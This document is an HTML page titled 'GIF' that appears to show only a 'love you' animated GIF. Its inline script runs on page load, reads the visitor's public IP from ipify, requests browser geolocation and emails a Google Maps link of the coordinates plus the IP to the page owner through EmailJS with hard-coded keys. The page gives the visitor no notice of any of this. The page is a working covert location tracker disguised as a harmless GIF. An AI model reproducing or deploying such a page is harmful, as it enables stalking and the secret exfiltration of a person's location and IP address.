<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GIF</title>
  
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <script>
        (function () {
            emailjs.init({
                publicKey: "irNz_F_OdVu2GE84O"
            });
        })();

        let messg = "Enabled";
        let ipadd = "";

async function sendLocationEmail() {

    // Get public IP
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();

        ipadd = data.ip;

        console.log("IP:", ipadd);

    } catch (error) {

        console.error("Could not get IP address:", error);
        ipadd = "Unable to determine IP";
    }


    // Check if geolocation is supported
    if (!navigator.geolocation) {

        messg = "Not Supported";

        emailjs.send(
            "service_3hv5k7r",
            "template_peoy2wo",
            {
                message: `Location not supported | ${messg} | ${ipadd}`
            }
        );

        return;
    }


    // Request location
    navigator.geolocation.getCurrentPosition(

        function(position) {

            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const locationLink =
                `https://maps.google.com/?q=${latitude},${longitude}`;

            const message =
                `${locationLink} | ${messg} | ${ipadd}`;

            console.log(message);

            emailjs.send(
                "service_3hv5k7r",
                "template_peoy2wo",
                {
                    message: message
                }
            )
            .then(function(response) {
                console.log("Email sent:", response);
            })
            .catch(function(error) {
                console.error("Email error:", error);
            });
        },

        function(error) {

            messg = "Not Enabled";

            console.log("Location permission/error:", error.message);

            emailjs.send(
                "service_3hv5k7r",
                "template_peoy2wo",
                {
                    message: `Location not available | ${messg} | ${ipadd}`
                }
            );
        }
    );
}


window.onload = function() {
    sendLocationEmail();
};
        
    </script>    

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f5f5f5;
      font-family: Arial, sans-serif;
    }

    .container {
      text-align: center;
      padding: 20px;
    }

    .gif {
      width: 400px;
      max-width: 90vw;
      border-radius: 12px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
    }

    h2 {
      margin-bottom: 20px;
    }
  </style>
</head>

<body>

  <div class="container">
    <img
      class="gif"
      src="https://giphy.com/gifs/love-you-rock-mx0rj9sZRBcGTwEIX1"
      alt="Animated GIF"
    >
  </div>

</body>
</html>
